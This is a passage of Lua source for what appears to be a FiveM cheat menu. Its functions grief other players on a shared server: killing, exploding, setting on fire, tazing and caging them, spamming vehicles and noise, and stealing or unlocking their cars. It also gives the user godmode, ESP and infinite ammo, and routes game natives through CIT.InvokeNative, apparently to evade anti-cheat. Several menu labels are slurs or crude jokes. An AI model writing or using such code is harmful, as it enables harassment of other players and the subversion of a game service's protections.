                    {text = 'Jump Intensity', type = 'slide', index = SliderKeyboard['jumpspeed']},
                    {text = 'Invisible',type = 'toggle', toggle = 'invisiblevehicle-function'},
                    {text = 'Instant Brake',type = 'toggle', toggle = 'instantbrake-function'},
                    {text = "Teleport to Nearest", func = function()
                    local closest = GetClosestVehicle(Winnie_GetEntityCoords(Winnie_PlayerPedId()), 2000.0, 0, 70)
                            Winnie_SetPedIntoVehicle(Winnie_PlayerPedId(), closest, -2)
                    end},

                    {text = '[CONFIG]', type = 'sep'},

                    {text = "Clean Car", func = function()
                        local getveh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                        Winnie_SetVehicleDirtLevel(getveh, 0)
                    end},
                    {text = "Refuel Oil", func = function()
                        if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                            local getveh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                            SetVehicleOilLevel(getveh, 100.0)
                        end
                    end},
                    {text = "Refuel Car", func = function()
                        local getveh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                        Winnie_SetVehicleFuelLevel(getveh, 100.0)
                    end},

                    {text = "Open all doors", func = function()
                        if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                            local getveh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                            for i = 1, 7 do
                                Winnie_SetVehicleDoorOpen(getveh, i, true, true)
                            end
                        end
                    end},

                    {text = "Close all doors", func = function()
                        if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                            local getveh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                            for i = 1, 7 do
                                Winnie_SetVehicleDoorShut(getveh, i, true, true)
                            end
                        end
                    end},


                {text = '[CUSTOM]', type = 'sep'},

                {text = "Vehicle at Maximum", func = function()
                    if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                        local getvh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                        max(getvh)
                    end
                end},



                {text = 'Rainbow Color',type = 'toggle', toggle = 'rbwcolor-function'},
                {text = 'Activate Color',type = 'toggle', toggle = 'active-function'},
                {text = 'Color R', type = 'slide', index = SliderKeyboard['colorrvehicle']},
                {text = 'Color G', type = 'slide', index = SliderKeyboard['colorgvehicle']},
                {text = 'Color B', type = 'slide', index = SliderKeyboard['colorbvehicle']},

                {text = '[CONFIG]', type = 'sep'},
                {text = 'Spawn Inside',type = 'toggle', toggle = 'spawninside-function'},




            },
            selectedFeature = 2, Anim = 1, scroll = 0, parent = 'Main Menu'
        },

        ['list_vehicle'] = {
            options = {
                {text = '[VEHICLE]', type = 'sep'},

            },
            selectedFeature = 2, Anim = 1, scroll = 0, parent = 'vehicle_menu'

        },
        ['addon_vehicle'] = {
            options = {
                {text = '[ADDON]', type = 'sep'},

            },
            selectedFeature = 2, Anim = 1, scroll = 0, parent = 'vehicle_menu'

        },

        ['online_menu'] = {
            options = {
            },
            selectedFeature = 1, Anim = 1, scroll = 0, parent = 'Main Menu'
        },

        ['online_option'] = {
            options = {
                {text = '[BASIC]', type = 'sep'},
                {text = 'Spectate', type = 'toggle', toggle = 'spectate-function'},

                {text = 'Clone Ped', func = function()
                    local ped = Winnie_GetPlayerPed(ZM_KeyboardUI.Select)
                    local coordsped = Winnie_GetEntityCoords(ped)
                    local ped_hash = Winnie_GetEntityModel(Winnie_GetPlayerPed(ZM_KeyboardUI.Select))
                    Winnie_CreatePed(1, ped_hash, coordsped.x, coordsped.y, coordsped.z + 1.0, 90.0, true, false)
                end},
                {text = 'Find Player', type = 'toggle', toggle = 'find-function'},
                {text = 'Copy Outfit', func = function()
                    local model = GetEntityModel(GetPlayerPed(ZM_KeyboardUI.Select))
                    SetPlayerModel(PlayerId(), model)
                    ClonePedToTarget(PlayerPedId(), GetPlayerPed(ZM_KeyboardUI.Select))
                end},
                {text = 'Give Vehicle', func = function()
                    CreateThread(function()
                        local result = KeyboardInput("Name of your vehicle", "", 30)
                        if result then
                            RequestModel(result)
                            while not HasModelLoaded(result) do
                                Wait(0)
                            end
                            CreateVehicle(result, GetEntityCoords(GetPlayerPed(ZM_KeyboardUI.Select)), GetEntityHeading(GetPlayerPed(ZM_KeyboardUI.Select)), true, true)
                        end
                    end)
                end},
                {text = '[TELEPORT]', type = 'sep'},
                {text = 'Steal Vehicle', func = function()
                    local ped = Winnie_GetPlayerPed(ZM_KeyboardUI.Select)
                    local vehofped = Winnie_GetVehiclePedIsIn(ped)
                    Winnie_TaskLeaveVehicle(ped, vehofped, 16)
                end},
                {text = 'Teleport to Player', func = function()
                    local _get = Winnie_GetEntityCoords(Winnie_GetPlayerPed(ZM_KeyboardUI.Select))
                    Winnie_SetEntityCoords(Winnie_PlayerPedId(), _get)
                end},
                {text = 'Teleport into Vehicle', func = function()
                    local vehicle = Winnie_GetVehiclePedIsIn(Winnie_GetPlayerPed(ZM_KeyboardUI.Select))
                    if Winnie_IsVehicleSeatFree(vehicle, 0) then
                        Winnie_SetPedIntoVehicle(Winnie_PlayerPedId(), vehicle, 0)
                    end
                end},


                {text = '[HEALTH]', type = 'sep'},
                {text = 'Give Heal', func = function()
                    local _get = Winnie_GetEntityCoords(Winnie_GetPlayerPed(ZM_KeyboardUI.Select))
                    CreatePickup(Winnie_GetHashKey("PICKUP_HEALTH_STANDARD"), _get)
                end},
                {text = 'Give Armor', func = function()
                    local _get = Winnie_GetEntityCoords(Winnie_GetPlayerPed(ZM_KeyboardUI.Select))
                    CreatePickup(Winnie_GetHashKey("PICKUP_ARMOUR_STANDARD"), _get)
                end},

                {text = '[WEAPON]', type = 'sep'},
                {text = 'Give ALL', func = function()
                    for k, v in pairs(weapons) do
                        Winnie_GiveWeaponToPed(Winnie_GetPlayerPed(ZM_KeyboardUI.Select), Winnie_GetHashKey(v), 250, false, false)
                    end
                end},
                {text = 'Remove ALL', func = function()
                    local ped = Winnie_GetPlayerPed(ZM_KeyboardUI.Select)
                    Winnie_RemoveAllPedWeapons(ped, true)
                end},
                {text = 'Give Specific', func = function()
                    local ped = Winnie_GetPlayerPed(ZM_KeyboardUI.Select)
                    local result = KeyboardInput("Name of weapon", "", 30)

                    if result then
                        Winnie_GiveWeaponToPed(ped, Winnie_GetHashKey(result), 250, false, false)
                    end
                end},
                {text = 'Remove Specific', func = function()
                    local ped = Winnie_GetPlayerPed(ZM_KeyboardUI.Select)
                    local result = KeyboardInput("Name of weapon", "", 30)
                    if result then
                        Winnie_RemoveWeaponFromPed(ped, Winnie_GetHashKey(result))
                    end
                end},

                {text = '[destroy]', type = 'sep'},
                {text = 'Explode', type = 'toggle', toggle = 'explode-function'},
                {text = 'Ear Rape', type = 'toggle', toggle = 'ear-function'},
                {text = 'Kill Player', type = 'toggle', toggle = 'kill-function'},
                {text = 'Taze Player', type = 'toggle', toggle = 'taze-function'},
                {text = 'Launch Player', type = 'toggle', toggle = 'launchplayer-function'},
                {text = 'Hydrant Player', type = 'toggle', toggle = 'hy-function'},
                {text = 'Molotov Player', type = 'toggle', toggle = 'molotov-function'},
                {text = 'Attach Object', func = function()
                    local coords = Winnie_GetEntityCoords(Winnie_GetPlayerPed(ZM_KeyboardUI.Select))
                    Winnie_RequestModel("prop_ballistic_shield_lod1")
                    while not Winnie_HasModelLoaded("prop_ballistic_shield_lod1") do
                        CIT.Wait(50)
                    end
                    local object = Winnie_IsCreateObject(Winnie_GetHashKey("prop_ballistic_shield_lod1"), coords, true, true, true)
                    Winnie_AttachEntityToEntity(object, Winnie_GetPlayerPed(ZM_KeyboardUI.Select), Winnie_GetPedBoneIndex(Winnie_GetPlayerPed(ZM_KeyboardUI.Select), 0), coords,  true, true, false, true, 1, true)
                end},
                {text = 'Spam Vehicle', func = function()
                    CreateThread(function()
                        local pedSelect = Winnie_GetPlayerPed(ZM_KeyboardUI.Select)
                        local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                        local hash = Winnie_GetHashKey(tostring("zentorno"))

                        Winnie_RequestModel(hash)
                        while not Winnie_HasModelLoaded(hash) do
                            CIT.Wait(50)
                        end

                        local vehicle = Winnie_CreateVehicle(hash, coordsPlayer, true, false)
                    end)
                end},
                {text = 'Carkill Player', func = function()
                    CreateThread(function()

                        local pedSelect = Winnie_GetPlayerPed(ZM_KeyboardUI.Select)
                        local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                        local hash = Winnie_GetHashKey(tostring("zentorno"))

                        Winnie_RequestModel(hash)
                        while not Winnie_HasModelLoaded(hash) do
                            CIT.Wait(50)
                        end
                        local vehicle = Winnie_CreateVehicle(hash, Winnie_GetEntityCoords(Winnie_GetPlayerPed(ZM_KeyboardUI.Select)), true, false)
                        Winnie_SetVehicleForwardSpeed(vehicle, 100.0)
                        end)
                    end},

                {text = '[CONFIG]', type = 'sep'},
                {text = 'Explode Type', type = 'slide', index = SliderKeyboard['explodetype']},
                {text = 'Force Launch', type = 'slide', index = SliderKeyboard['forcelaunch']},


            },
            selectedFeature = 2, Anim = 1, scroll = 0, parent = 'online_menu'
        },

        ['misc_menu'] = {
            options = {
                {text = '[Troll Option]', type = 'sep'},

                {text = "Kill ALL", func = function()
                    for k, v in pairs(GetActivePlayers()) do
                        local pedSelect = Winnie_GetPlayerPed(v)
                        local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                        local boneCoords = Winnie_GetPedBoneCoords(pedSelect, 31086, 0, 0, 0)
                        Winnie_ShootSingleBulletBetweenCoords(coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, boneCoords.x, boneCoords.y, boneCoords.z, 9000.0, 0, Winnie_GetHashKey("WEAPON_ASSAULTRIFLE_MK2"), Winnie_PlayerPedId(), true, false, 100000.0)
                    end
                end},
                {text = "Explode ALL", func = function()
                    for k, v in pairs(GetActivePlayers()) do
                        local coordsPlayer = Winnie_GetEntityCoords(Winnie_GetPlayerPed(v))
                        Winnie_AddExplosion(coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, SliderKeyboard['explodetype'].value, 1000.0, true, false, true)
                    end
                end},
                {text = "Spawn Mass", func = function()
                    CreateThread(function()
                        for k, v in pairs(GetActivePlayers()) do
                            local pedSelect = Winnie_GetPlayerPed(v)
                            local coordsPlayer = Winnie_GetEntityCoords(pedSelect)

                            local car = Winnie_GetHashKey("Mule")
                            Winnie_RequestModel(car)
                            while not Winnie_HasModelLoaded(car) do
                                Winnie_RequestModel(car)
                                Wait(0)
                            end

                            local vehicle = Winnie_CreateVehicle(car, coordsPlayer.x, coordsPlayer.y + 1, coordsPlayer.z, 600.0, true, false)
                            Winnie_SetEntityAsMissionEntity(vehicle, true, true)
                            Winnie_SetVehicleNumberPlateText(vehicle, "m1000")
                            local hash = Winnie_GetHashKey("cs_movpremmale")
                            while not Winnie_HasModelLoaded(hash) do
                                Wait(500)
                                Winnie_RequestModel(hash)
                            end
                            local pedpnj = Winnie_CreatePed("PED_TYPE_CIVMALE", "cs_movpremmale", -60.96, 360.39, 112.10,  600.161, false, true)
                            Winnie_TaskWarpPedIntoVehicle(pedpnj, vehicle, -1)
                            Winnie_SetVehicleForwardSpeed(vehicle, 1000.0)
                            end
                        end)
                end},
                {text = "Random Peds", func = function()
                    CreateThread(function()
                        for k, v in pairs(GetActivePlayers()) do

                            local pedSelect = Winnie_GetPlayerPed(v)
                            local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                            local ped_hash = Winnie_GetEntityModel(pedSelect)

                            RequestModel(GetHashKey(ped_hash))
                            while not HasModelLoaded(ped_hash) do
                                Wait(0)
                            end

                            Winnie_CreatePed(1, ped_hash, coordsPlayer.x, coordsPlayer.y, coordsPlayer.z + 1.0, 90.0, true, false)
                            end
                        end)
                end},
                {text = "Random Props", func = function()
                    for k, v in pairs(GetActivePlayers()) do
                        local pedSelect = Winnie_GetPlayerPed(v)
                        local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                        local object = Winnie_IsCreateObject(Winnie_GetHashKey(randomProps[math.random(#randomProps)]), 164.2524, -93.01299, 0, true, true, true)
                        Winnie_AttachEntityToEntity(object, pedSelect, Winnie_GetPedBoneIndex(pedSelect, 0x796E), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
                    end
                end},
                {text = "Kick All Vehicle", func = function()
                    for k, v in pairs(GetActivePlayers()) do
                        Winnie_ClearPedTasksImmediately(Winnie_GetPlayerPed(v))
                    end
                end},
                {text = "Clear Ped Tasks", func = function()
                    for k, v in pairs(GetActivePlayers()) do
                        local pedSelect = Winnie_GetPlayerPed(v)
                        Winnie_ClearPedTasksImmediately(pedSelect)
                    end
                end},
                   {text = "Unlock Vehicle", func = function()
                    for k, v in pairs(GetGamePool("CVehicle")) do
                        SetVehicleDoorsLocked(v, 1)
                        SetVehicleDoorsLockedForPlayer(v, Winnie_PlayerId(), false)
                        SetVehicleDoorsLockedForAllPlayers(v, false)
                    end
                end},
                {text = 'Molotov Players', type = 'toggle', toggle = 'molotvall-function'},
                {text = 'Explode Vehicles', type = 'toggle', toggle = 'explodeallveh-function'},
                {text = 'Fly All Vehicles', type = 'toggle', toggle = 'flyallveh-function'},
                {text = 'Hydrant All Players', type = 'toggle', toggle = 'hyallplayer-function'},

                {text = '[Weapon]', type = 'sep'},
                {text = "Give Weapon All", func = function()
                    for k, v in pairs(GetActivePlayers()) do
                        for k, a in pairs(weapons) do
                            Winnie_GiveWeaponToPed(Winnie_GetPlayerPed(v), GetHashKey(a), 255, true, false)
                        end
                    end
                end},
                {text = "Remove All Weapons", func = function()
                    for k, v in pairs(GetActivePlayers()) do
                        Winnie_RemoveAllPedWeapons(Winnie_GetPlayerPed(v), true)
                    end
                end},

                {text = '[DESTROY]', type = 'sep'},

                {text = "Terrorist Attack", func = function()

                end},
                {text = "Spawn Transexual", func = function()

                end},
                {text = 'Ear Rape', type = 'toggle', toggle = 'ear2-function'},
                {text = 'PTFX Spamming', type = 'toggle', toggle = 'ptfxall-function'},

                {text = 'Cage All Players', type = 'toggle', toggle = 'cgallplayer-function'},
                {text = 'Whale Mass Spawn', type = 'toggle', toggle = 'whalemass-function'},

                {text = '[CONFIG]', type = 'sep'},
                {text = 'Explode Type', type = 'slide', index = SliderKeyboard['explodetype']},
                {text = 'PTFX Scale', type = 'slide', index = SliderKeyboard['ptfxvalue']},
                {text = 'Fly Value', type = 'slide', index = SliderKeyboard['valuefly']},


            },
            selectedFeature = 2, Anim = 1, scroll = 0, parent = 'Main Menu'
        },

        ['setting_menu'] = {
                options = {
                    {text = '[BASIC]', type = 'sep'},
                    {text = 'Close Menu', func = function()
                        DuiCloseKeyboard()
                        ZM_KeyboardUI.MenuOpen = false
                    end},
                    {text = 'Panish Crash', func = function()
                            while true do
                        end
                    end},
                    {text = 'Keybind Menu', func = function()
                        CreateThread(function()
                            local value, BindingTouch = bind()
                            keyboard["BindingTouch"] = BindingTouch
                            keyboard["Value"] = value
                        end)
                    end},
                    {text = '[COLOR]', type = 'sep'},
                    {text = 'Color R', type = 'slide', index = SliderKeyboard['colormenur']},
                    {text = 'Color G', type = 'slide', index = SliderKeyboard['colormenug']},
                    {text = 'Color B', type = 'slide', index = SliderKeyboard['colormenub']},
                    {text = 'Reset Color', func = function()
                        SliderKeyboard['colormenur'].value = 0
                        SliderKeyboard['colormenug'].value = 50
                        SliderKeyboard['colormenub'].value = 255
                    end},
                    {text = '[CONFIG]', type = 'sep'},
                    {text = 'Animation Button', type = 'toggle', toggle = 'animation-function'},
                    {text = 'Scrollbar GTA', type = 'toggle', toggle = 'scrollbar-function'},

                },
            selectedFeature = 2, Anim = 1, scroll = 0, parent = 'Main Menu'
            },
            ['protect_menu'] = {
                options = {
                    {text = '[PROTECT]', type = 'sep'},
                    {text = 'Anti Fire', type = 'toggle', toggle = 'antifire-function'},
                    {text = 'Anti Particle', type = 'toggle', toggle = 'antiparticle-function'},
                    {text = 'Anti Object Attach', type = 'toggle', toggle = 'antiobject-function'},
                },
                selectedFeature = 2, Anim = 1, scroll = 0, parent = 'Main Menu'
            },
            ['glife_menu'] = {
                options = {
                    {text = '[G-Life]', type = 'sep'},
                    {text = "Heal Glife", func = function()
                        local coords = Winnie_GetEntityCoords(Winnie_PlayerPedId())
                        Winnie_NetworkResurrectLocalPlayer(coords, Winnie_GetEntityHeading(Winnie_PlayerPedId(), true, false))
                    end},
                    {text = 'Godmode', type = 'toggle', toggle = 'godemodeglife-function'},
                    {text = 'ESP Loot Bag', type = 'toggle', toggle = 'espbag-function'},
                    {text = 'Strafe Assistance', type = 'toggle', toggle = 'strafehelp-function'},
                    {text = 'Strafe Speed', type = 'slide', index = SliderKeyboard['strafespeed']},



                    {text = '[Zombies]', type = 'sep'},
                    {text = 'Auto-Farm', type = 'toggle', toggle = 'farmz-function'},
                    {text = 'Auto-Farm XP', type = 'toggle', toggle = 'farmzxp-function'},
                    {text = 'Antizin Shot', type = 'toggle', toggle = 'antizein-function'},
                    {text = 'Stamina Shot', type = 'toggle', toggle = 'stamina-function'},
                    {text = 'Teleport Zombie', type = 'toggle', toggle = 'tpz-function'},

                    {text = '[Vehicle]', type = 'sep'},
                    {text = 'Radar Vehicle', type = 'menubutton', menu = 'radar_menu'},
                    {text = 'Warp Vehicle', type = 'toggle', toggle = 'wrpveh-function'},
                    {text = 'Remove Windows', type = 'toggle', toggle = 'rmvwindows-function'},
                    {text = 'Teleport To Vehicle', type = 'toggle', toggle = 'tptoveh-function'},


                    {text = '[Weapon]', type = 'sep'},
                    {text = 'Freeze Ammo', type = 'toggle', toggle = 'freezeammo-function'},
                    {text = 'Infinite Ammo', type = 'toggle', toggle = 'infiniammo-function'},

                },
                selectedFeature = 2, Anim = 1, scroll = 0, parent = 'Main Menu'
            },


        ['radar_menu'] = {
            options = {

            },
            selectedFeature = 1, Anim = 1, scroll = 0, parent = 'glife_menu'
        },

        ['radar_option'] = {
            options = {
                {text = '[VEHICLE]', type = 'sep'},
                {text = "Warp Vehicle", func = function()
                    SetEntityCoords(ZM_KeyboardUI.Selectvehicle, GetEntityCoords(PlayerPedId()))
                end},

                {text = "Find Vehicle", func = function()
                    local coordsPlayer = Winnie_GetEntityCoords(ZM_KeyboardUI.Selectvehicle)
                    Winnie_SetNewWaypoint(coordsPlayer.x, coordsPlayer.y)
                end},

                {text = "Teleport to Vehicle", func = function()
                    SetEntityCoords(PlayerPedId(), GetEntityCoords(ZM_KeyboardUI.Selectvehicle))
                end},

                {text = "Teleport in Vehicle", func = function()
                    local vehicle = ZM_KeyboardUI.Selectvehicle
                    if Winnie_IsVehicleSeatFree(vehicle, 0) then
                        Winnie_SetPedIntoVehicle(Winnie_PlayerPedId(), vehicle, 0)
                    end
                end},


            },
            selectedFeature = 2, Anim = 1, scroll = 0, parent = 'radar_menu'
        },

        ['Main Menu'] = {
            options = {
                {text = 'Player Menu', type = 'menubutton', menu = 'player_menu'},
                {text = 'Visuals Menu', type = 'menubutton', menu = 'visual_menu'},
                {text = 'Weapon Menu', type = 'menubutton', menu = 'weapon_menu'},
                {text = 'Vehicle Menu', type = 'menubutton', menu = 'vehicle_menu'},
                {text = 'Online Menu', type = 'menubutton', menu = 'online_menu'},
                {text = 'Misc Menu', type = 'menubutton', menu = 'misc_menu'},
                {text = 'Settings Menu', type = 'menubutton', menu = 'setting_menu'},
                {text = 'Protection Menu', type = 'menubutton', menu = 'protect_menu'},
                {text = 'G-Life Menu', type = 'menubutton', menu = 'glife_menu'},





            },
            selectedFeature = 1, Anim = 1, scroll = 0
        },

    }


    Citizen.CreateThread(function()
        while true do
            Wait(500)

    if ZM_KeyboardUI.ActiveMenu == "radar_menu" then


        if #ZM_KeyboardUI.SubMenus['radar_menu'].options > ZM_KeyboardUI.Menu.Max then
            if ZM_KeyboardUI.SubMenus['radar_menu'].scroll > #ZM_KeyboardUI.SubMenus['radar_menu'].options-ZM_KeyboardUI.Menu.Max then
                ZM_KeyboardUI.SubMenus['radar_menu'].scroll = #ZM_KeyboardUI.SubMenus['radar_menu'].options-ZM_KeyboardUI.Menu.Max
            end
        end


        ZM_KeyboardUI.SubMenus['radar_menu'].options = {}

            for k, v in pairs(GetGamePool("CVehicle")) do
                    local model = GetEntityModel(v)
                    local name = GetDisplayNameFromVehicleModel(model)
                    table.insert(ZM_KeyboardUI.SubMenus['radar_menu'].options, {text = name, type = 'menubutton', menu = 'radar_option', func = function()
                        ZM_KeyboardUI.Selectvehicle = v
                    end})
                end




    elseif ZM_KeyboardUI.ActiveMenu == "online_menu" then

        if #ZM_KeyboardUI.SubMenus['online_menu'].options > ZM_KeyboardUI.Menu.Max then
            if ZM_KeyboardUI.SubMenus['online_menu'].scroll > #ZM_KeyboardUI.SubMenus['online_menu'].options-ZM_KeyboardUI.Menu.Max then
                ZM_KeyboardUI.SubMenus['online_menu'].scroll = #ZM_KeyboardUI.SubMenus['online_menu'].options-ZM_KeyboardUI.Menu.Max
            end
        end


        ZM_KeyboardUI.SubMenus['online_menu'].options = {}

        for k, v in pairs(GetActivePlayers()) do

            table.insert(ZM_KeyboardUI.SubMenus['online_menu'].options, {text = "["..GetPlayerServerId(v).."] " .. string.upper(GetPlayerName(v)), type = 'menubutton', menu = 'online_option', func = function()
                ZM_KeyboardUI.Select = v
                    end})
                end

            end
        end
    end)


    for k, v in pairs(vehicle1) do
        table.insert(ZM_KeyboardUI.SubMenus['list_vehicle'].options, {text = v.button, func = function()
            spawn2(v.name)
        end})
    end
    for k, v in pairs(vehicle2) do
        if IsModelValid(GetHashKey(v.spawn)) then
            table.insert(ZM_KeyboardUI.SubMenus['addon_vehicle'].options, {text = v.name, func = function()
                spawn2(v.spawn)
            end})
        else
            table.insert(ZM_KeyboardUI.SubMenus['addon_vehicle'].options, {text = "Not Found :((", func = function()

            end})
        end
    end


    for k, v in pairs(ped) do
        table.insert(ZM_KeyboardUI.SubMenus['models_self'].options, {text = v.id, func = function()
                while not HasModelLoaded(v.props) do
                    RequestModel(v.props)
                    Wait(0)
                end
                SetPlayerModel(PlayerId(), v.props)
        end})
    end

    for k, v in pairs(weaponTable2) do
        table.insert(ZM_KeyboardUI.SubMenus['weapon_basic'].options, {text = v.button, func = function()
            GiveWeaponToPed(PlayerPedId(), GetHashKey(v.name), 1000, false, true)
        end})
    end



    local FreecamModding = {
        "Teleport",
        "Spam Car",
        "Spam Ped",
        "Create Props",
        "Shoot Bullet",
        "Ptfx Spam"
    }

    local deleteconfig = {
        "silentaim",
        "nospread",
        "aimlock",
        "numbergodmode",
        "numberinvisible",
        "numberstrun",
        "numberstamina",
        "numberrollinfinity",
        "numberboxes",
        "numbersklt",
        "numberplname",
        "numberline",
        "numberblps",
        "numbernowater",
        "numbernoprops",
        "numberhbar",
        "numberabar",
        "numberfog",
        "numberhair",
        "numberespweapon",
        "numberespsnight",
        "numberespwall",
        "numberesammoilimited",
        "numbershitmaler",
        "numberfov",
        "numberfovfill",
        "numberbrake",
        "numberjump",
        "numberdrft",
        "numbernitro",
        "numberhandling",
        "numberautorepair",
        "numberboost",
        "numberantz",
        "numberstaminss",
        "numberglifegodmode",
        "numberinfinammo",
        "numberstrf",
        "numberremovewon",
        "numberfreeammo",
        "numberincluseself"
    }

    function Winnie_DrawRect(x, y, width, height, r, g, b, a)
        return CIT.InvokeNative(0x3A618A217E5154F0, x, y, width, height, r, g, b, a)
    end
    function Winnie_DisableAllControlActions(p1)
        return CIT.InvokeNative(0x5F4B6931816E599B, p1)
    end
    function Winnie_CreateDui(url, width, height)
        return CIT.InvokeNative(0x23eaf899, tostring(url), width, height, CIT.ReturnResultAnyway(), CIT.ResultAsLong())
    end
    function Winnie_GetScreenCoordFromWorldCoord(worldX, worldY, worldZ)
        return CIT.InvokeNative(0x34E82F05DF2974F5, worldX, worldY,worldZ,CIT.PointerValueFloat(),CIT.PointerValueFloat(),CIT.ReturnResultAnyway())
    end
    function Winnie_CreateRuntimeTextureFromDuiHandle(txd, txn, duiHandle)
        return CIT.InvokeNative(0xb135472b, txd, txn, tostring(duiHandle), CIT.ReturnResultAnyway(), CIT.ResultAsLong())
    end
    function Winnie_CreateRuntimeTxd(name)
        return CIT.InvokeNative(0x1f3ac778, tostring(name), CIT.ReturnResultAnyway(), CIT.ResultAsLong())
    end
    function Winnie_GetDuiHandle(duiObject)
        return CIT.InvokeNative(0x1655d41d, duiObject, CIT.ReturnResultAnyway(), CIT.ResultAsString())
    end
    function Winnie_CreateRuntimeTextureFromImage(txd, txn, fileName)
        return CIT.InvokeNative(0x786d8bc3, txd, tostring(txn), tostring(fileName), CIT.ReturnResultAnyway(), CIT.ResultAsLong())
    end
    function Winnie_SetTextColour(red, green, blue, alpha)
        return CIT.InvokeNative(0xBE6B23FFA53FB442, red, green, blue, alpha)
    end
    function Winnie_SetTextFont(fontType)
        return CIT.InvokeNative(0x66E0276CC5F6B9DA, fontType)
    end
    function Winnie_SetTextScale(scale, size)
        return CIT.InvokeNative(0x07C837F9A01C34C9, scale, size)
    end
    function Winnie_SetTextCentre(align)
        return CIT.InvokeNative(0xC02F4DBFB51D988B, align)
    end
    function Winnie_IsDisabledControlPressed(padIndex, control)
        return CIT.InvokeNative(0xE2587F8CBBD87B1D, padIndex, control, CIT.ReturnResultAnyway())
    end
    function Winnie_IsDisabledControlJustPressed(padIndex, control)
        return CIT.InvokeNative(0x91AEF906BCA88877, padIndex, control, CIT.ReturnResultAnyway())
    end
    function Winnie_SetTextRightJustify(toggle)
        return CIT.InvokeNative(0x6B3C4650BC8BEE47, toggle)
    end
    function Winnie_BeginTextCommandDisplayText(text)
        return CIT.InvokeNative(0x25FBB336DF1804CB, text)
    end
    function Winnie_SetTextShadow()
        return CIT.InvokeNative(0x1CA3E9EAC9D93E5E)
    end
    function Winnie_SetTextOutline()
        return CIT.InvokeNative(0x2513DFB0FB8400FE)
    end
    function Winnie_GetActiveScreenResolution()
        return CIT.InvokeNative(0x873C9F3104101DD3, CIT.PointerValueInt(), CIT.PointerValueInt())
    end
    function Winnie_EndTextCommandDisplayText(x, y)
        return CIT.InvokeNative(0xCD015E5BB0D96A57, x, y)
    end
    function Winnie_DisableControlAction(padIndex, control, disable) return
        CIT.InvokeNative(0xFE99B66D079CF6BC, padIndex, control, disable)
    end
    function Winnie_DrawSprite(textureDict, textureName, screenX, screenY, width, height, heading, red, green, blue, alpha)
        if alpha and not CIT.InvokeNative(0x0145F696AAAAD2E4, textureDict, CIT.ReturnResultAnyway()) then
            CIT.InvokeNative(0xDFA2EF8E04127DD5, textureDict)
            CIT.InvokeNative(0xBE2CACCF5A8AA805, textureDict)
        end

        CIT.InvokeNative(0xE7FFAE5EBF23D890, textureDict, textureName, screenX, screenY, width, height, heading, red, green, blue, alpha)
    end

    function Winnie_AddTextComponentSubstringWebsite(website)
        return CIT.InvokeNative(0x94CF4AC034C9C986, tostring(website))
    end

    function Winnie_RenderScriptCams (render, ease, easeTime, p3, p4)
        return CIT.InvokeNative(0x07E5B515DB0636FC, render, ease, easeTime, p3, p4)
    end

    function Winnie_SetCamCoord (cam, posX, posY, posZ)
        return CIT.InvokeNative(0x4D41783FB745E42E, cam, posX, posY, posZ)
    end
    function Winnie_DestroyCam (cam)
        return CIT.InvokeNative(0x865908C81A2C22E9, cam)
    end
    function Winnie_GetEntityHealth (entity)
        return CIT.InvokeNative(0xEEF059FAD016D209, entity, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
    end
    function Winnie_IsPedAPlayer (ped)
        return CIT.InvokeNative(0x12534C348C6CB68B, ped, CIT.ReturnResultAnyway())
    end
    function Winnie_CreateVehicle (modelHash, x, y, z, heading, networkHandle, vehiclehandle)
        return CIT.InvokeNative(
            0xAF35D0D2583051B0,
            modelHash,
            x,
            y,
            z,
            heading,
            networkHandle,
            vehiclehandle,
            CIT.ReturnResultAnyway(),
            CIT.ResultAsInteger()
        )
    end
    function Winnie_cmcmcmc(toggle, playerPed)
        return CIT.InvokeNative(0x423DE3854BB50894, toggle, playerPed)
    end
    function Winnie_ToggleVehicleMod (vehicle, modType, toggle)
        return CIT.InvokeNative(0x2A1F4F37F95BAD08, vehicle, modType, toggle)
    end
    function Winnie_SetVehicleTyresCanBurst (vehicle, toggle)
        return CIT.InvokeNative(0xEB9DC3C7D8596C46, vehicle, toggle, CIT.ReturnResultAnyway())
    end
    function Winnie_ClearPedBloodDamage (ped)
        return CIT.InvokeNative(0x8FE22675A5A45817, ped)
    end
    function Winnie_GetGameplayCamCoords()
        return CIT.InvokeNative(0xA200EB1EE790F448, CIT.ReturnResultAnyway(), CIT.ResultAsFloat())
    end
    function Winnie_SetEntityAsMissionEntity (entity, value, p2)
        return CIT.InvokeNative(0xAD738C3085FE7E11, entity, value, p2)
    end
    function Vdist (x1, y1, z1, x2, y2, z2)
        return CIT.InvokeNative(
            0x2A488C176D52CCA5,
            x1,
            y1,
            z1,
            x2,
            y2,
            z2,
            CIT.ReturnResultAnyway(),
            CIT.ResultAsFloat()
        )
    end
    function Winnie_SetVehicleNumberPlateTextIndex (vehicle, plateIndex)
        return CIT.InvokeNative(0x9088EB5A43FFB0A1, vehicle, plateIndex, CIT.ReturnResultAnyway())
    end
    function Winnie_SetVehicleNumberPlateText (vehicle, plateText)
        return CIT.InvokeNative(0x95A88F0B409CDA47, vehicle, tostring(plateText))
    end
    function Winnie_SetNewWaypoint (x, y)
        return CIT.InvokeNative(0xFE43368D2AA4F2FC, x, y)
    end
    function Winnie_NetworkIsInSession()
        return CIT.InvokeNative(0xCA97246103B63917, CIT.ReturnResultAnyway())
    end
    function Winnie_SetControlNormal(padIndex, control, amount)
        return CIT.InvokeNative(0xE8A25867FBA3B05E, padIndex, control, amount, CIT.ReturnResultAnyway())
    end
    function Winnie_ApplyForceToEntity (
        entity,
        forceType,
        x,
        y,
